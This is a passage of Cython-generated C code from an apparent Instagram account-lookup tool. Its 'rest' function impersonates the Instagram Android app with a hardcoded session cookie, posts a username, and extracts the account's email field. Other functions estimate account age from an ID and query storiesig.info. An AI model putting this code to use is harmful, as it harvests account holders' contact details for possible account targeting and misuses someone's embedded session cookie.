  __Pyx_RefNannySetupContext("rest", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(19); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 585, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Session_Id, __pyx_kp_u_50cc6861_7036_43b4_802e_fb428279) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Rawclienttime, __pyx_kp_u_1700251574_982) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Speed, __pyx_kp_u_1kbps) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_Speed_KBPS, __pyx_kp_u_1_000) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalBytes_B, __pyx_kp_u_0) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalTime_MS, __pyx_kp_u_0) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Bloks_Version_Id, __pyx_n_u_c80c5fb30dfae9e273e4009f03b18280) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Type, __pyx_n_u_WIFI) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Capabilities, __pyx_kp_u_3brTvw) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_App_ID, __pyx_kp_u_567067343352427) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_User_Agent, __pyx_kp_u_Instagram_100_0_0_17_129_Android) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Language, __pyx_kp_u_en_GB_en_US) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Cookie, __pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Encoding, __pyx_kp_u_gzip_deflate) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Host, __pyx_kp_u_i_instagram_com) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_FB_HTTP_Engine, __pyx_n_u_Liger) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Connection, __pyx_kp_u_keep_alive) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Length, __pyx_kp_u_356) < 0) __PYX_ERR(0, 585, __pyx_L3_error)
      __pyx_v_headers = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 606, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = PyNumber_Add(__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240_2, __pyx_v_user); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 606, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_kp_u__37); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 606, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_signed_body, __pyx_t_6) < 0) __PYX_ERR(0, 606, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_ig_sig_key_version, __pyx_kp_u_4) < 0) __PYX_ERR(0, 606, __pyx_L3_error)
      __pyx_v_data = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_requests); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 609, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_post); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 609, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 611, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 611, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 611, __pyx_L3_error)

      
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__36, __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 609, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_json); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 613, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 613, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_response = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_email); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 614, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_r = __pyx_t_4;
      __pyx_t_4 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

    
    __pyx_t_8 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_8) {
      __Pyx_AddTraceback("source.rest", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_7) < 0) __PYX_ERR(0, 615, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_7);

      
      __Pyx_INCREF(__pyx_kp_u_no_REST);
      __Pyx_XDECREF_SET(__pyx_v_r, __pyx_kp_u_no_REST);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_r);
  __pyx_r = __pyx_v_r;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("source.rest", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_r);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_21date(PyObject *__pyx_self, PyObject *__pyx_v_hy); /*proto*/
static PyMethodDef __pyx_mdef_6source_21date = {"date", (PyCFunction)__pyx_pw_6source_21date, METH_O, 0};
static PyObject *__pyx_pw_6source_21date(PyObject *__pyx_self, PyObject *__pyx_v_hy) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("date (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_20date(__pyx_self, ((PyObject *)__pyx_v_hy));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_20date(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_hy) {
  PyObject *__pyx_v_ranges = NULL;
  PyObject *__pyx_v_upper = NULL;
  PyObject *__pyx_v_year = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *(*__pyx_t_10)(PyObject *);
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("date", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = PyList_New(10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 622, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_INCREF(__pyx_tuple__38);
      __Pyx_GIVEREF(__pyx_tuple__38);
      PyList_SET_ITEM(__pyx_t_4, 0, __pyx_tuple__38);
      __Pyx_INCREF(__pyx_tuple__39);
      __Pyx_GIVEREF(__pyx_tuple__39);
      PyList_SET_ITEM(__pyx_t_4, 1, __pyx_tuple__39);
      __Pyx_INCREF(__pyx_tuple__40);
      __Pyx_GIVEREF(__pyx_tuple__40);
      PyList_SET_ITEM(__pyx_t_4, 2, __pyx_tuple__40);
      __Pyx_INCREF(__pyx_tuple__41);
      __Pyx_GIVEREF(__pyx_tuple__41);
      PyList_SET_ITEM(__pyx_t_4, 3, __pyx_tuple__41);
      __Pyx_INCREF(__pyx_tuple__42);
      __Pyx_GIVEREF(__pyx_tuple__42);
      PyList_SET_ITEM(__pyx_t_4, 4, __pyx_tuple__42);
      __Pyx_INCREF(__pyx_tuple__43);
      __Pyx_GIVEREF(__pyx_tuple__43);
      PyList_SET_ITEM(__pyx_t_4, 5, __pyx_tuple__43);
      __Pyx_INCREF(__pyx_tuple__44);
      __Pyx_GIVEREF(__pyx_tuple__44);
      PyList_SET_ITEM(__pyx_t_4, 6, __pyx_tuple__44);
      __Pyx_INCREF(__pyx_tuple__45);
      __Pyx_GIVEREF(__pyx_tuple__45);
      PyList_SET_ITEM(__pyx_t_4, 7, __pyx_tuple__45);
      __Pyx_INCREF(__pyx_tuple__46);
      __Pyx_GIVEREF(__pyx_tuple__46);
      PyList_SET_ITEM(__pyx_t_4, 8, __pyx_tuple__46);
      __Pyx_INCREF(__pyx_tuple__47);
      __Pyx_GIVEREF(__pyx_tuple__47);
      PyList_SET_ITEM(__pyx_t_4, 9, __pyx_tuple__47);
      __pyx_v_ranges = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __pyx_v_ranges; __Pyx_INCREF(__pyx_t_4); __pyx_t_5 = 0;
      for (;;) {
        if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_4)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_6 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_5); __Pyx_INCREF(__pyx_t_6); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 635, __pyx_L3_error)
        #else
        __pyx_t_6 = PySequence_ITEM(__pyx_t_4, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 635, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        #endif
        if ((likely(PyTuple_CheckExact(__pyx_t_6))) || (PyList_CheckExact(__pyx_t_6))) {
          PyObject* sequence = __pyx_t_6;
          Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
          if (unlikely(size != 2)) {
            if (size > 2) __Pyx_RaiseTooManyValuesError(2);
            else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
            __PYX_ERR(0, 635, __pyx_L3_error)
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          if (likely(PyTuple_CheckExact(sequence))) {
            __pyx_t_7 = PyTuple_GET_ITEM(sequence, 0); 
            __pyx_t_8 = PyTuple_GET_ITEM(sequence, 1); 
          } else {
            __pyx_t_7 = PyList_GET_ITEM(sequence, 0); 
            __pyx_t_8 = PyList_GET_ITEM(sequence, 1); 
          }
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_8);
          #else
          __pyx_t_7 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 635, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_8 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 635, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_8);
          #endif
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        } else {
          Py_ssize_t index = -1;
          __pyx_t_9 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 635, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_10 = Py_TYPE(__pyx_t_9)->tp_iternext;
          index = 0; __pyx_t_7 = __pyx_t_10(__pyx_t_9); if (unlikely(!__pyx_t_7)) goto __pyx_L11_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_7);
          index = 1; __pyx_t_8 = __pyx_t_10(__pyx_t_9); if (unlikely(!__pyx_t_8)) goto __pyx_L11_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_8);
          if (__Pyx_IternextUnpackEndCheck(__pyx_t_10(__pyx_t_9), 2) < 0) __PYX_ERR(0, 635, __pyx_L3_error)
          __pyx_t_10 = NULL;
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          goto __pyx_L12_unpacking_done;
          __pyx_L11_unpacking_failed:;
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __pyx_t_10 = NULL;
          if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
          __PYX_ERR(0, 635, __pyx_L3_error)
          __pyx_L12_unpacking_done:;
        }
        __Pyx_XDECREF_SET(__pyx_v_upper, __pyx_t_7);
        __pyx_t_7 = 0;
        __Pyx_XDECREF_SET(__pyx_v_year, __pyx_t_8);
        __pyx_t_8 = 0;

        
        __pyx_t_6 = PyObject_RichCompare(__pyx_v_hy, __pyx_v_upper, Py_LE); __Pyx_XGOTREF(__pyx_t_6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 636, __pyx_L3_error)
        __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_6); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 636, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (__pyx_t_11) {

          
          __Pyx_XDECREF(__pyx_r);
          __Pyx_INCREF(__pyx_v_year);
          __pyx_r = __pyx_v_year;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          goto __pyx_L7_try_return;

          
        }

        
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_XDECREF(__pyx_r);
      __Pyx_INCREF(__pyx_int_2023);
      __pyx_r = __pyx_int_2023;
      goto __pyx_L7_try_return;

      
    }
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_12) {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L7_try_return:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L0;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_AddTraceback("source.date", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ranges);
  __Pyx_XDECREF(__pyx_v_upper);
  __Pyx_XDECREF(__pyx_v_year);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_23InfoAcc(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_23InfoAcc = {"InfoAcc", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_23InfoAcc, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_23InfoAcc(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_username = 0;
  PyObject *__pyx_v_gg = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("InfoAcc (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_username,&__pyx_n_s_gg,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_username)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_gg)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("InfoAcc", 1, 2, 2, 1); __PYX_ERR(0, 644, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "InfoAcc") < 0)) __PYX_ERR(0, 644, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_username = values[0];
    __pyx_v_gg = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("InfoAcc", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 644, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_6source_22InfoAcc(__pyx_self, __pyx_v_username, __pyx_v_gg);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_22InfoAcc(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_username, PyObject *__pyx_v_gg) {
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_rrr = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_v_Id = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fows = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fowg = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_pp = NULL;
  PyObject *__pyx_v_hy = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_datte = NULL;
  PyObject *__pyx_v_tlg = NULL;
  PyObject *__pyx_v_ff = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  int __pyx_t_10;
  char const *__pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  Py_UCS4 __pyx_t_21;
  int __pyx_t_22;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("InfoAcc", 0);

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 647, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_accept, __pyx_kp_u_application_json_text_plain) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_origin, __pyx_kp_u_https_storiesig_info) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_priority, __pyx_kp_u_u_1_i) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_referer, __pyx_kp_u_https_storiesig_info_2) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_sec_ch_ua, __pyx_kp_u_Not_A_Brand_v_99_Google_Chrome) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_sec_ch_ua_mobile, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_sec_ch_ua_platform, __pyx_kp_u_Windows) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_sec_fetch_dest, __pyx_n_u_empty) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_sec_fetch_mode, __pyx_n_u_cors) < 0) __PYX_ERR(0, 647, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_sec_fetch_site, __pyx_kp_u_same_site) < 0) __PYX_ERR(0, 647, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 658, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
